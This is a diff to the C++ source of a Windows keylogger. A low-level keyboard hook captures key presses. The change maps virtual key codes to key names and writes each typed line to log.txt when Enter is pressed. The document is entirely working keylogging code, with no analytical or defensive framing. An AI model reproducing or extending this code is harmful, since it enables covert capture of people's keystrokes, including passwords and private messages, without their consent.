@@ -5,6 +5,7 @@
 #include <fstream>
 #include <string>
 #include <windows.h>
+#include "KeyConst.h"
 
 std::string keylog = ""; // this string holds the keys logged
 
@@ -19,13 +20,18 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
     if(wparam==WM_KEYDOWN||wparam==WM_SYSKEYDOWN)
     {
-        keylog+=kbs->vkCode;
+        keylog += Keys::KEYS[kbs->vkCode].Name;
         // test section needs to be optimized * done for testing purpose
         std::ofstream outfile;
-        outfile.open("log.txt",std::ios_base::app);
-        outfile<<keylog<<std::endl;
-        outfile.close();
-        keylog="";
+
+        if(kbs->vkCode==VK_RETURN)
+        {
+            outfile.open("log.txt",std::ios_base::app);
+            outfile<<keylog<<std::endl;
+            outfile.close();
+            keylog="";
+        }
+
         // test section ends here
     }
 
